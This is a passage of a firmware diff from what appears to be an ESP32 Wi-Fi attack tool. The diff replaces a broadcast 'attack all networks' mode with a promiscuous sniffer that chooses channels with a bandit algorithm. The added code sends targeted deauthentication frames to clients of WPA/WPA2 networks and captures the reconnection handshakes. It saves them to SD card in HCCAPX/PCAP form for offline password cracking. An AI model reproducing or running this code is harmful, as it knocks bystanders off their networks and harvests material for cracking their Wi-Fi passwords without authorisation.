+            if (ap->channel != channel) continue;
+            
+            // Skip if not WPA/WPA2
+            if (ap->authmode == WIFI_AUTH_OPEN) continue;
+            
+            // Skip if client was recently deauthed (cooldown)
+            if (client->last_deauth_us > 0 && 
+                (now - client->last_deauth_us) < HS_DEAUTH_COOLDOWN_US) continue;
+            
+            // Send targeted deauth to this client
+            MY_LOG_INFO(TAG, "[HS-DEAUTH] Deauthing %02X:%02X:%02X:%02X:%02X:%02X from '%s' (Ch %d)",
+                       client->mac[0], client->mac[1], client->mac[2],
+                       client->mac[3], client->mac[4], client->mac[5],
+                       ap->ssid, ap->channel);
+            
+            // Re-init HCCAPX serializer for this AP (so save works correctly)
+            {
+                size_t ssid_len = strlen(ap->ssid);
+                hccapx_serializer_init((const uint8_t *)ap->ssid, ssid_len);
+            }
+            
+            hs_send_targeted_deauth(client->mac, ap->bssid, ap->channel);
+            client->last_deauth_us = now;
+            client->deauthed = true;
+            ap->last_deauth_us = now;
+            deauth_count_this_dwell++;
+            
+            // Limit deauths per dwell to avoid channel congestion
+            if (deauth_count_this_dwell >= 3) break;
+        }
+        
+        // If we deauthed someone, stay on this channel a bit longer to catch handshake
+        if (deauth_count_this_dwell > 0) {
+            vTaskDelay(pdMS_TO_TICKS(2000)); // 2s extra to catch reconnection
+        }
+        
+        // Calculate D-UCB reward
+        double reward = (double)hs_dwell_new_clients + 3.0 * (double)hs_dwell_eapol_frames;
+        ducb_update(ch_idx, reward);
+        
+        // Check for completed handshakes and save
+        for (int i = 0; i < hs_ap_count; i++) {
+            hs_ap_target_t *ap = &hs_ap_targets[i];
+            if (ap->complete && !ap->has_existing_file) {
+                MY_LOG_INFO(TAG, "[HS-SNIFF] Saving complete handshake for '%s'...", ap->ssid);
+                // Re-init HCCAPX for this AP before save
+                size_t ssid_len = strlen(ap->ssid);
+                hccapx_serializer_init((const uint8_t *)ap->ssid, ssid_len);
+                
+                if (hs_save_handshake_to_sd(i)) {
+                    ap->has_existing_file = true;
+                    total_handshakes_captured++;
+                    MY_LOG_INFO(TAG, "[HS-SNIFF] Handshake #%d saved! Total APs: %d, Clients: %d",
+                               total_handshakes_captured, hs_ap_count, hs_client_count);
+                    
+                    // Re-init PCAP after save to free memory and start fresh
+                    pcap_serializer_init();
+                    // Re-capture beacons for remaining APs
+                    for (int j = 0; j < hs_ap_count; j++) {
+                        if (!hs_ap_targets[j].complete && !hs_ap_targets[j].has_existing_file) {
+                            hs_ap_targets[j].beacon_captured = false; // Will be re-captured
+                        }
+                    }
+                }
+            }
+        }
+        
+        // Periodic stats
+        if ((now - last_stats_time) >= HS_STATS_INTERVAL_US) {
+            int wpa_aps = 0, completed = 0, skipped = 0;
+            for (int i = 0; i < hs_ap_count; i++) {
+                if (hs_ap_targets[i].authmode != WIFI_AUTH_OPEN) wpa_aps++;
+                if (hs_ap_targets[i].complete) completed++;
+                if (hs_ap_targets[i].has_existing_file) skipped++;
+            }
+            
+            // Find top D-UCB channel
+            int top_ch = 0;
+            int top_pulls = 0;
+            for (int i = 0; i < ducb_channel_count; i++) {
+                if (ducb_channels[i].total_pulls > top_pulls) {
+                    top_pulls = ducb_channels[i].total_pulls;
+                    top_ch = ducb_channels[i].channel;
+                }
+            }
+            
+            MY_LOG_INFO(TAG, "[HS-STATS] APs: %d (WPA: %d), Clients: %d, Handshakes: %d, Skipped: %d",
+                       hs_ap_count, wpa_aps, hs_client_count, completed, skipped);
+            MY_LOG_INFO(TAG, "[HS-STATS] D-UCB top channel: %d (%d pulls), Current: %d",
+                       top_ch, top_pulls, channel);
+            
+            last_stats_time = now;
+        }
+    }
+    
+    // Disable promiscuous mode
+    esp_wifi_set_promiscuous(false);
+    
+    MY_LOG_INFO(TAG, "[HS-SNIFF] Sniffer mode stopped. Total handshakes: %d", total_handshakes_captured);
+}
+
+// Handshake attack task - dispatches to selected or sniffer mode
 static void handshake_attack_task(void *pvParameters) {
     (void)pvParameters;
     
     MY_LOG_INFO(TAG, "Handshake attack task started.");
-    MY_LOG_INFO(TAG, "Mode: %s", handshake_selected_mode ? "Selected networks only" : "Scan all networks periodically");
+    MY_LOG_INFO(TAG, "Mode: %s", handshake_selected_mode ? "Selected networks" : "Sniffer + D-UCB");
     
     // Set LED to cyan for handshake attack
     esp_err_t led_err = led_set_color(0, 255, 255); // Cyan
@@ -3756,192 +4593,10 @@ static void handshake_attack_task(void *pvParameters) {
         ESP_LOGW(TAG, "Failed to set LED for handshake attack: %s", esp_err_to_name(led_err));
     }
     
-    int64_t last_scan_time = 0;
-    const int64_t SCAN_INTERVAL_US = 5 * 60 * 1000000; // 5 minutes in microseconds
-    
-    while (handshake_attack_active && !operation_stop_requested) {
-        // In non-selected mode, do periodic scans
-        if (!handshake_selected_mode) {
-            int64_t current_time = esp_timer_get_time();
-            if (current_time - last_scan_time >= SCAN_INTERVAL_US || handshake_target_count == 0) {
-                MY_LOG_INFO(TAG, "Performing periodic scan for networks...");
-                
-                // Start background scan with fast timings
-                esp_err_t scan_result = start_background_scan(FAST_SCAN_MIN_TIME, FAST_SCAN_MAX_TIME);
-                if (scan_result != ESP_OK) {
-                    MY_LOG_INFO(TAG, "Failed to start scan: %s", esp_err_to_name(scan_result));
-                    vTaskDelay(pdMS_TO_TICKS(5000));
-                    continue;
-                }
-                
-                // Wait for scan to complete (dynamic timeout based on channel times)
-                int timeout = 0;
-                int timeout_limit = get_scan_timeout_iterations();
-                while (g_scan_in_progress && timeout < timeout_limit && handshake_attack_active && !operation_stop_requested) {
-                    vTaskDelay(pdMS_TO_TICKS(100));
-                    timeout++;
-                }
-                
-                if (operation_stop_requested) {
-                    MY_LOG_INFO(TAG, "Stop requested during scan, terminating...");
-                    break;
-                }
-                
-                if (g_scan_in_progress) {
-                    MY_LOG_INFO(TAG, "Scan taking longer than expected, waiting for completion...");
-                    // Wait additional time for scan to complete naturally (30s max)
-                    int extra_wait = 0;
-                    while (g_scan_in_progress && extra_wait < 300 && handshake_attack_active && !operation_stop_requested) {
-                        vTaskDelay(pdMS_TO_TICKS(100));
-                        extra_wait++;
-                    }
-                    // If still in progress after extra wait, then stop
-                    if (g_scan_in_progress) {
-                        MY_LOG_INFO(TAG, "Scan still in progress, forcing stop...");
-                        esp_wifi_scan_stop();
-                        g_scan_in_progress = false;
-                        vTaskDelay(pdMS_TO_TICKS(500));
-                        continue;
-                    }
-                }
-                
-                if (!g_scan_done || g_scan_count == 0) {
-                    MY_LOG_INFO(TAG, "Scan failed or no results, retrying in 5 seconds...");
-                    vTaskDelay(pdMS_TO_TICKS(5000));
-                    continue;
-                }
-                
-                // Copy scan results to handshake targets
-                handshake_target_count = (g_scan_count < MAX_AP_CNT) ? g_scan_count : MAX_AP_CNT;
-                memcpy(handshake_targets, g_scan_results, handshake_target_count * sizeof(wifi_ap_record_t));
-                handshake_current_index = 0;
-                
-                MY_LOG_INFO(TAG, "Found %d networks to attack", handshake_target_count);
-                last_scan_time = current_time;
-            }
-        }
-        
-        // Check if we're done with all selected networks
-        if (handshake_selected_mode) {
-            bool all_captured = true;
-            for (int i = 0; i < handshake_target_count; i++) {
-                if (!handshake_captured[i]) {
-                    all_captured = false;
-                    break;
-                }
-            }
-            
-            if (all_captured) {
-                MY_LOG_INFO(TAG, "All selected networks have been captured! Attack complete.");
-                break;
-            }
-        }
-        
-        // Pwnagotchi-style attack strategy
-        if (handshake_selected_mode) {
-            MY_LOG_INFO(TAG, "===== Selected Networks Mode =====");
-            MY_LOG_INFO(TAG, "Attacking %d selected networks in loop until all captured", handshake_target_count);
-            MY_LOG_INFO(TAG, "Strategy: Deauth burst (5 packets) every 1s, 3 bursts per network");
-        } else {
-            MY_LOG_INFO(TAG, "===== Scan-All Mode (Pwnagotchi-style) =====");
-            MY_LOG_INFO(TAG, "1. Quick scan ALL channels (2.4GHz + 5GHz)");
-            MY_LOG_INFO(TAG, "2. Attack ALL networks found (no filtering)");
-            MY_LOG_INFO(TAG, "3. Deauth burst (5 packets) every 1s, 3 bursts per network");
-            
-            // PHASE 1: Quick scan all channels (only in scan-all mode)
-            MY_LOG_INFO(TAG, "");
-            MY_LOG_INFO(TAG, "===== PHASE 1: Quick Channel Scan =====");
-            
-            int total_channels = NUM_CHANNELS_24GHZ + NUM_CHANNELS_5GHZ;
-            MY_LOG_INFO(TAG, "Scanning %d channels (%d x 2.4GHz + %d x 5GHz) @ 500ms each...",
-                       total_channels, NUM_CHANNELS_24GHZ, NUM_CHANNELS_5GHZ);
-            
-            // This will take about: (13 + 25) * 0.5s = 19 seconds
-            quick_scan_all_channels();
-        }
-        
-        // PHASE 2: Attack networks
-        MY_LOG_INFO(TAG, "");
-        if (handshake_selected_mode) {
-            MY_LOG_INFO(TAG, "===== Attacking Selected Networks =====");
-        } else {
-            MY_LOG_INFO(TAG, "===== PHASE 2: Attack All Networks =====");
-        }
-        MY_LOG_INFO(TAG, "Attacking %d networks...", handshake_target_count);
-        
-        // Attack all networks regardless of signal strength
-        int attacked_count = 0;
-        int captured_count = 0;
-        
-        for (int i = 0; i < handshake_target_count && handshake_attack_active && !operation_stop_requested; i++) {
-            wifi_ap_record_t *ap = &handshake_targets[i];
-            
-            // Skip if already captured
-            if (handshake_captured[i]) {
-                continue;
-            }
-            
-            // Check if file already exists
-            if (check_handshake_file_exists((const char*)ap->ssid)) {
-                MY_LOG_INFO(TAG, "[%d/%d] Skipping '%s' - PCAP already exists", 
-                           i + 1, handshake_target_count, (const char*)ap->ssid);
-                handshake_captured[i] = true;
-                captured_count++;
-                continue;
-            }
-            
-            attacked_count++;
-            MY_LOG_INFO(TAG, "");
-            MY_LOG_INFO(TAG, ">>> [%d/%d] Attacking '%s' (Ch %d, RSSI: %d dBm) <<<", 
-                       i + 1, handshake_target_count, (const char*)ap->ssid, ap->primary, ap->rssi);
-            
-            // Attack with burst strategy
-            attack_network_with_burst(ap);
-            
-            // Check if captured
-            if (attack_handshake_is_complete()) {
-                handshake_captured[i] = true;
-                captured_count++;
-                MY_LOG_INFO(TAG, "✓✓✓ Handshake #%d captured! ✓✓✓", captured_count);
-            }
-            
-            // Delay before next network (channel stabilization)
-            if (i < handshake_target_count - 1) {
-                MY_LOG_INFO(TAG, "Cooling down 2s before next network...");
-                vTaskDelay(pdMS_TO_TICKS(2000));
-            }
-        }
-        
-        MY_LOG_INFO(TAG, "");
-        MY_LOG_INFO(TAG, "===== Attack Cycle Complete =====");
-        MY_LOG_INFO(TAG, "Total networks: %d", handshake_target_count);
-        MY_LOG_INFO(TAG, "Networks attacked this cycle: %d", attacked_count);
-        MY_LOG_INFO(TAG, "Handshakes captured so far: %d", captured_count);
-        
-        // Check if all selected networks captured (for selected mode)
-        if (handshake_selected_mode) {
-            bool all_done = true;
-            int remaining = 0;
-            for (int i = 0; i < handshake_target_count; i++) {
-                if (!handshake_captured[i]) {
-                    all_done = false;
-                    remaining++;
-                }
-            }
-            
-            if (all_done) {
-                MY_LOG_INFO(TAG, "✓✓✓ All selected networks captured! Attack complete. ✓✓✓");
-                break;
-            }
-            
-            // Continue looping until all captured
-            MY_LOG_INFO(TAG, "Selected mode: %d networks still need handshakes, repeating attack cycle...", remaining);
-            vTaskDelay(pdMS_TO_TICKS(3000)); // Small delay before next loop
-        } else {
-            // In non-selected mode, wait before next scan cycle
-            MY_LOG_INFO(TAG, "Scan-all mode: Waiting for next scan interval...");
-            vTaskDelay(pdMS_TO_TICKS(10000)); // Wait 10 seconds before checking scan interval
-        }
+    if (handshake_selected_mode) {
+        handshake_attack_task_selected();
+    } else {
+        handshake_attack_task_sniffer();
     }
     
     // Cleanup
@@ -4037,25 +4692,19 @@ static int cmd_start_handshake(int argc, char **argv) {
         MY_LOG_INFO(TAG, "Will spend max 40s on each network");
         MY_LOG_INFO(TAG, "Will stop automatically when all networks captured");
     } else {
-        // Scan-all mode
+        // Sniffer + D-UCB mode (replaces old scan-all)
         handshake_selected_mode = false;
         
-        MY_LOG_INFO(TAG, "Starting WPA Handshake Capture - Scan All Mode");
-        MY_LOG_INFO(TAG, "No networks selected - will scan and attack all networks");
-        MY_LOG_INFO(TAG, "Periodic scan every 5 minutes");
+        MY_LOG_INFO(TAG, "Starting WPA Handshake Capture - Sniffer + D-UCB Mode");
+        MY_LOG_INFO(TAG, "No networks selected - promiscuous sniffer with D-UCB channel selection");
+        MY_LOG_INFO(TAG, "Will discover APs/clients from traffic and send targeted deauth");
         MY_LOG_INFO(TAG, "Will run until 'stop' command");
-        
-        // Do initial scan
-        if (g_scan_count > 0) {
-            handshake_target_count = (g_scan_count < MAX_AP_CNT) ? g_scan_count : MAX_AP_CNT;
-            memcpy(handshake_targets, g_scan_results, handshake_target_count * sizeof(wifi_ap_record_t));
-            MY_LOG_INFO(TAG, "Using %d networks from last scan", handshake_target_count);
-        } else {
-            MY_LOG_INFO(TAG, "No previous scan results - will scan on startup");
-        }
+        MY_LOG_INFO(TAG, "Existing handshakes in /sdcard/lab/handshakes/ will be skipped");
     }
     
-    MY_LOG_INFO(TAG, "Method: Broadcast deauth + passive capture");
+    MY_LOG_INFO(TAG, "Method: %s", handshake_selected_mode 
+                ? "Broadcast deauth + passive capture" 
+                : "Sniffer + D-UCB + targeted deauth");
     MY_LOG_INFO(TAG, "Handshakes will be saved automatically to SD card");
     MY_LOG_INFO(TAG, "Use 'stop' to stop the attack");
     
@@ -4064,7 +4713,7 @@ static int cmd_start_handshake(int argc, char **argv) {
     BaseType_t result = xTaskCreate(
         handshake_attack_task,
         "handshake_attack",
-        8192,  // Stack size
+        12288, // Stack size (larger for sniffer mode PCAP/HCCAPX operations)
         NULL,
         5,     // Priority
         &handshake_attack_task_handle
